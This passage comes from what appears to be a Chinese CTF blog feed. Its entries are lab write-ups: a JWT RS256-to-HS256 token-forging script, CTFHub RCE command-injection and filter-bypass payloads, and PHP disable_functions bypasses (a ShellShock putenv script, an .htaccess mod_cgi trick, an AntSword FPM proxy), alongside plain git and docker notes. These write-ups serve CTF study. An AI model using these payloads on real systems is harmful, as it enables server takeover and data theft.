src="https://img-blog.csdnimg.cn/5da55fadcc664157bfd8481e7bd0d57d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><h1 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h1><p>把cookie清空后提交用户名密码</p><p>得到一串jwt</p><p>丢进<br><img src="https://img-blog.csdnimg.cn/f12a54b8f88848f49959045582a95cb7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>发现是RS256编码（不对称式编码）</p><p>需要改为对称式编码</p><p>如HS256</p><p>题目中给了public key</p><p>用PUBLIC_KEY采用HS256进行加密payload构造token</p><p>借用<a href="https://blog.csdn.net/loseheart157" target="_blank" rel="noopener">大神h0ld1rs</a>的脚本</p><blockquote><p>无签名那段脚本</p><p>是勉勉强强写出来的</p><p>这题就先用大神的脚本吧</p><p>我太菜了</p></blockquote><pre><code class="python"># coding=GBKimport hmacimport hashlibimport base64file = open(&#39;publickey.pem&#39;)#需要将文中的publickey下载    与脚本同目录key = file.read()# Paste your header and payload hereheader = &#39;{&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;}&#39;payload = &#39;{&quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}&#39;# Creating encoded headerencodeHBytes = base64.urlsafe_b64encode(header.encode(&quot;utf-8&quot;))encodeHeader = str(encodeHBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)# Creating encoded payloadencodePBytes = base64.urlsafe_b64encode(payload.encode(&quot;utf-8&quot;))encodePayload = str(encodePBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)# Concatenating header and payloadtoken = (encodeHeader + &quot;.&quot; + encodePayload)# Creating signaturesig = base64.urlsafe_b64encode(hmac.new(bytes(key, &quot;UTF-8&quot;), token.encode(&quot;utf-8&quot;), hashlib.sha256).digest()).decode(&quot;UTF-8&quot;).rstrip(&quot;=&quot;)print(token + &quot;.&quot; + sig)</code></pre><p>运行后把token返回去验证</p><p>成功</p><p><img src="https://img-blog.csdnimg.cn/169a632c18eb4233a605602f6f6b9cde.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/cbb9f91b8d69482283ce362d1407284f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h1&gt;&lt;p&gt;题目附件：&lt;a href=&quot;https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJb
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="jwt" scheme="/tags/jwt/"/>
    
      <category term="json web token" scheme="/tags/json-web-token/"/>
    
  </entry>
  
  <entry>
    <title>git命令</title>
    <link href="/2022/08/git/"/>
    <id>/2022/08/git/</id>
    <published>2022-08-29T10:18:54.825Z</published>
    <updated>2022-08-31T03:11:33.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="创建仓库命令"><a href="#创建仓库命令" class="headerlink" title="创建仓库命令"></a>创建仓库命令</h1><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>git init 命令用于在目录中创建新的 Git 仓库。<br>在文件夹中，会被创建出一个.git的一个隐藏文件，这时，本地库已经初始化完成.</p><h2 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h2><p>git clone 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。<br>拷贝项目命令格式如下：</p><pre><code class="shell">git clone [url]</code></pre><h1 id="提交与修改"><a href="#提交与修改" class="headerlink" title="提交与修改"></a>提交与修改</h1><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>git add 命令可将该文件添加到暂存区。</p><p>添加一个或多个文件到暂存区</p><h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>git commit 命令将暂存区内容添加到本地仓库中。<br>提交暂存区到本地仓库中:</p><pre><code class="shell">git commit -m [message]</code></pre><p>[message] 可以是一些备注信息。</p><h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p>git status 命令用于查看在你上次提交之后是否有对文件进行再次修改。</p><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>git rm 命令用于删除文件。<br>如果只是简单地从工作目录中手工删除文件，运行 git status 时就会在 Changes not staged for commit 的提示。</p><h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><p>git mv 命令用于移动或重命名一个文件、目录或软连接。</p><pre><code class="shell">git mv [file] [newfile]</code></pre><p>如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数：</p><pre><code class="shell">git mv -f [file] [newfile]</code></pre><h1 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h1><h2 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h2><p>显示所有远程仓库：</p><pre><code class="shell">git remote -v</code></pre><h2 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h2><p>git pull 命令用于从远程获取代码并合并本地的版本。 </p><pre><code class="shell">git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code></pre><h2 id="push"><a href="#push" class="headerlink" title="push"></a>push</h2><p>git push 命用于从将本地的分支版本上传到远程并合并。</p><pre><code class="shell">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;创建仓库命令&quot;&gt;&lt;a href=&quot;#创建仓库命令&quot; class=&quot;headerlink&quot; title=&quot;创建仓库命令&quot;&gt;&lt;/a&gt;创建仓库命令&lt;/h1&gt;&lt;h2 id=&quot;init&quot;&gt;&lt;a href=&quot;#init&quot; class=&quot;headerlink&quot; title=&quot;i
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="git" scheme="/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>kali安装docker</title>
    <link href="/2022/08/docker/"/>
    <id>/2022/08/docker/</id>
    <published>2022-08-29T10:18:54.823Z</published>
    <updated>2022-08-31T03:11:27.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h1><pre><code class="shell">apt-get updateapt-get install docker-engine# 安装结束，打开docker服务service docker start# 验证安装，运行测试样例docker --versiondocker run hello-world#测试</code></pre><h1 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h1><pre><code class="shell">docker --versiondocker imagesdocker ps -adocker run -d --name 123 -p 127.0.0.1:80:80 镜像名docker stop 123</code></pre><p><a href="https://www.runoob.com/docker/docker-command-manual.html" target="_blank" rel="noopener">其他常用命令见菜鸟教程</a></p><h1 id="dockers底层原理"><a href="#dockers底层原理" class="headerlink" title="dockers底层原理"></a>dockers底层原理</h1><h2 id="Namespaces"><a href="#Namespaces" class="headerlink" title="Namespaces"></a>Namespaces</h2><blockquote><p>命名空间是 Linux 为我们提供的==用于分离进程树、网络接口、挂载点以及进程间通信等资源==的方法。在日常使用Linux时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p></blockquote><h2 id="CGroups"><a href="#CGroups" class="headerlink" title="CGroups"></a>CGroups</h2><blockquote><p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们==提供物理资源上的隔离==，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。<br>如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。<br>==在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。==</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali安装docker&quot;&gt;&lt;a href=&quot;#kali安装docker&quot; class=&quot;headerlink&quot; title=&quot;kali安装docker&quot;&gt;&lt;/a&gt;kali安装docker&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;apt-get 
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="kali" scheme="/tags/kali/"/>
    
      <category term="docker" scheme="/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>ctfhub-rce</title>
    <link href="/2022/08/ctfhub-rce/"/>
    <id>/2022/08/ctfhub-rce/</id>
    <published>2022-08-29T10:18:54.816Z</published>
    <updated>2022-08-31T03:11:12.260Z</updated>
    
    <content type="html"><![CDATA[<p>rce：远程代码执行漏洞<br>分为远程命令执行ping和远程代码执行evel。<br><strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞</strong>。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p><h1 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h1><pre><code class="php">&lt;?php    if(isset($_REQUEST[&#39;cmd&#39;])){        eval($_REQUEST[&#39;cmd&#39;]);    }    else{        highlight_file(__FILE__);    }?&gt;</code></pre><p>传参给cmd来eval</p><pre><code class="php">/?cmd=system(&quot;ls /&quot;);//此处因为根目录无flag 所以看上一级目录</code></pre><p>找到后 再cat /flag_<em>**</em></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>这里使用strpos函数</p><blockquote><p>strpos:查找字符串首次出现的位置</p><p>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</p></blockquote><p>题目使用</p><pre><code class="php">if(!strpos($_GET[&quot;file&quot;],&quot;flag&quot;)){//无flag字符即可运行    include $_GET[&quot;file&quot;];}</code></pre><p>来包含文件，而下方给出的shell.txt含有eval漏洞</p><p>于是包含它（shell.txt没有“flag”字符 所以这里strpos没影响）</p><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218182857507.png" alt="image-20220218182857507"></p><p>通过get(包含文件) post(传参)并用来得到flag</p><h1 id="php-info"><a href="#php-info" class="headerlink" title="php info"></a>php info</h1><pre><code class="php+HTML">&lt;?phpif (isset($_GET[&#39;file&#39;])){      if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {        include($_GET[&quot;file&quot;]);           }    else {         echo &quot;Hacker!!!&quot;;        }}else {    highlight_file(__FILE__);}?&gt;&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt; </code></pre><p>点击phpinfo链接 可查看php环境</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><pre><code class="c++">/*php:// — 访问各个输入/输出流（I/O streams）PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。  php://input是个可以访问请求的原始数据的只读流。</code></pre><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218162728184.png" alt="image-20220218162728184"></p><h1 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h1><p>看环境 无法使用php://input</p><pre><code class="shell">&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#39;file&#39;])) {    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) {        include($_GET[&quot;file&quot;]);    } else {        echo &quot;Hacker!!!&quot;;    }} else {    highlight_file(__FILE__);}?&gt;</code></pre><p>但还必须是php://开头</p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://filter</a></h2><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219174206504.png" alt="image-20220219174206504"></p><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219112308277.png" alt="image-20220219112308277"></p><h1 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h1><p>同phpinfo做法相同</p><h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>输入命令</p><pre><code class="shell">127.0.0.1;ls</code></pre><p>然后cat时出现了问题</p><p>输出被限制了</p><p>于是用管道符号来限制输出base64</p><p>得到后再解码</p><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218170811553.png" alt="image-20220218170811553"></p><h1 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h1><pre><code class="php+html">&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $ip = $_GET[&#39;ip&#39;];    $m = [];    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) {//过滤了cat        $cmd = &quot;ping -c 4 {$ip}&quot;;        exec($cmd, $res);    }     else {        $res = $m;    }}?&gt;&lt;pre&gt;&lt;?php    if ($res) {        print_r($res);    }?&gt;&lt;/pre&gt;&lt;?php    show_source(__FILE__);?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h1 id="more"><a href="#more" class="headerlink" title="more"></a>more</h1><p>Linux more 命令类似 cat  ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b  键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p><pre><code class="ini">more [-dlfpcsu] [-num] [+/pattern] [+linenum] [fileNames..]</code></pre><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171602745.png" alt="image-20220218171602745"></p><h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><p>在linux里空格可用&lt; 或 ${IFS}代替</p><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171910282.png" alt="image-20220218171910282"></p><h1 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h1><p>cat [file]|base64还可以用base64 [file]</p><pre><code class="php+HTML">&lt;?php$res = FALSE;if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) {    $ip = $_GET[&#39;ip&#39;];    $m = [];    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) {        $cmd = &quot;ping -c 4 {$ip}&quot;;        exec($cmd, $res);    } else {        $res = $m;    }}?&gt;</code></pre><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219104650896.png" alt="image-20220219104650896"></p><h1 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h1><pre><code class="php">!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;, $ip</code></pre><p>;可以用%0a(url编码)    cat用base64    flag用正则f<em>**    </em>lag等    空格用 ${IFS}</p><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219105932534.png" alt="image-20220219105932534"></p><p><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110644693.png" alt="image-20220219110644693"><img src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110736333.png" alt="image-20220219110736333"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;rce：远程代码执行漏洞&lt;br&gt;分为远程命令执行ping和远程代码执行evel。&lt;br&gt;&lt;strong&gt;其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞&lt;/strong&gt;。相当于直接操控服务器电脑的cmd命令行
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="ctfhub" scheme="/tags/ctfhub/"/>
    
      <category term="rce" scheme="/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>Bypass disable_function</title>
    <link href="/2022/08/Bypass%20disable_function/"/>
    <id>/2022/08/Bypass disable_function/</id>
    <published>2022-08-29T10:18:54.815Z</published>
    <updated>2022-08-30T11:33:19.810Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><p>时间紧 于是先采用最省时的方法<br>先蚁剑连<br><img src="https://img-blog.csdnimg.cn/5939a50eab1c40fe8eff4ae65dc3b730.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现打不开flag文件<br>要使用蚁剑插件<code>绕过disabled function</code></p><blockquote><p>如果蚁剑插件市场打不开的话可以去github搜<br>github上有说明 按着他的安</p></blockquote><p>连上之后在蚁剑主页面右键webshell使用该插件<br>按照步骤操作<br>成功后把webshell地址改为http://……/.antproxy.php<br>在连上就能tac了<br><code>tac /flag</code></p><h1 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h1><p>进去发现连不上<br>查了下大佬博客说是环境不正常<br>原理如下</p><blockquote><p>如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效。</p></blockquote><p>脚本</p><pre><code class="php">&lt;?php$cmd = &quot; tac /flag&gt;/var/www/html/1.txt&quot;;putenv(&quot;PHP_DMIND=() { :; };$cmd&quot;);error_log(&quot;dmind&quot;,1); echo file_get_contents(&quot;/var/www/html/1.txt&quot;);?&gt;</code></pre><p>用蚁剑传进去后<br>浏览器访问这个文件即可在1.txt看到flag<br><img src="https://img-blog.csdnimg.cn/3d91c09a976d423dac82102531093e0c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><p><img src="https://img-blog.csdnimg.cn/b725c6e6ac734ae483c2f7810f7d639d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令</p><blockquote><p>1.Mod CGI就是把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP.<br>2.它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行.<br>3.在.htaccess文件中可定制用户定义标识头<br>4.添加Options +ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本<br>5.添加AddHandler cgi-script .cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序</p></blockquote><p>条件</p><ol><li>必须是apache环境</li><li>mod_cgi已经启用</li><li>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</li><li>必须有权限写.htaccess文件</li></ol><h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><p>.htaccess</p><pre><code class="handlebars">Options +ExecCGIAddHandler cgi-script .cgi   </code></pre><p>shell.cgi</p><pre><code class="shell">#!/bin/shecho&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b</code></pre><h2 id="简单方法："><a href="#简单方法：" class="headerlink" title="简单方法："></a>简单方法：</h2><p>蚁剑连<br>还是那个插件bypass！<br><img src="https://img-blog.csdnimg.cn/62979eb3a1e84ce580aad7229184b420.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h1><ol><li>FPM是fast-cgi的协议解析器</li><li>webserver使用cgi协议封装好用户的请求发送给FPM</li><li>FPM按照cgi的协议将TCP流解析成真正的数据</li></ol><p><img src="https://img-blog.csdnimg.cn/fd9b0f38878649ae853da3e31f36780c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>蚁剑bypass<br>模式：FPM<br>地址：127.0.0.1：9000或localhost：9000<br>植入后修改shell地址为http://……/.antproxy.php</p><pre><code class="php">&lt;?phpfunction get_client_header(){    $headers=array();    foreach($_SERVER as $k=&gt;$v){        if(strpos($k,&#39;HTTP_&#39;)===0){            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);            if($k==&#39;Host&#39;) continue;            $headers[]=&quot;$k:$v&quot;;        }    }    return $headers;}function header_callback($str){    return strtoupper($str[0]);}function parseHeader($sResponse){    list($headerstr,$sResponse)=explode(&quot;&quot;,$sResponse, 2);    $ret=array($headerstr,$sResponse);    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){        $ret=parseHeader($sResponse);    }    return $ret;}set_time_limit(120);$headers=get_client_header();$host = &quot;127.0.0.1&quot;;$port = 61921;$errno = &#39;&#39;;$errstr = &#39;&#39;;$timeout = 30;$url = &quot;/index.php&quot;;if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];};$fp = fsockopen($host, $port, $errno, $errstr, $timeout);if(!$fp){    return false;}$method = &quot;GET&quot;;$post_data = &quot;&quot;;if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {    $method = &quot;POST&quot;;    $post_data = file_get_contents(&#39;php://input&#39;);}$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;}$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;$out .= implode(&quot;\r\n&quot;,$headers);$out .= &quot;\r\n\r\n&quot;;$out .= &quot;&quot;.$post_data;fputs($fp, $out);$response = &#39;&#39;;while($row=fread($fp, 4096)){    $response .= $row;}fclose($fp);$pos = strpos($response, &quot;\r\n\r\n&quot;);$response = substr($response, $pos+4);echo $response;</code></pre><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><blockquote><p>利用的是PHP Garbage Collector程序中的堆溢出触发</p></blockquote><p><a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">题目附件</a><br><em>其实蚁剑的reference就有这附件 包括后面的大佬脚本</em><br>可以用蚁剑一把梭<br><img src="https://img-blog.csdnimg.cn/d187ee0e20c14aaca8350fb68dc9c622.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>另附<br>==<a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">大佬poc</a>==<br>UAF的脚本里面都有<br>==tql！==</p><h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><blockquote><p>漏洞利用json在序列化中的堆溢出触发bypass，漏洞为bug #77843</p></blockquote><p>蚁剑一把梭</p><h2 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h2><blockquote><p>漏洞利用的是 debug_backtrace这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为bug #76047</p></blockquote><h1 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h1><p><a href="https://www.laruence.com/2020/03/11/5475.html" target="_blank" rel="noopener">PHP FFI详解</a></p><blockquote><p>==<strong>disabled function:</strong>==<br>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</p></blockquote><h1 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h1><ul><li>github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/</li><li><a href="https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80" target="_blank" rel="noopener">https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80</a></li></ul><pre><code class="php">&lt;?phpfunction get_client_header(){    $headers=array();    foreach($_SERVER as $k=&gt;$v){        if(strpos($k,&#39;HTTP_&#39;)===0){            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);            if($k==&#39;Host&#39;) continue;            $headers[]=&quot;$k:$v&quot;;        }    }    return $headers;}function header_callback($str){    return strtoupper($str[0]);}function parseHeader($sResponse){    list($headerstr,$sResponse)=explode(&quot;&quot;,$sResponse, 2);    $ret=array($headerstr,$sResponse);    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){        $ret=parseHeader($sResponse);    }    return $ret;}set_time_limit(120);$headers=get_client_header();$host = &quot;127.0.0.1&quot;;$port = 63947;$errno = &#39;&#39;;$errstr = &#39;&#39;;$timeout = 30;$url = &quot;/index.php&quot;;if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];};$fp = fsockopen($host, $port, $errno, $errstr, $timeout);if(!$fp){    return false;}$method = &quot;GET&quot;;$post_data = &quot;&quot;;if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {    $method = &quot;POST&quot;;    $post_data = file_get_contents(&#39;php://input&#39;);}$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;}$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;$out .= implode(&quot;\r\n&quot;,$headers);$out .= &quot;\r\n\r\n&quot;;$out .= &quot;&quot;.$post_data;fputs($fp, $out);$response = &#39;&#39;;while($row=fread($fp, 4096)){    $response .= $row;}fclose($fp);$pos = strpos($response, &quot;\r\n\r\n&quot;);$response = substr($response, $pos+4);echo $response;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
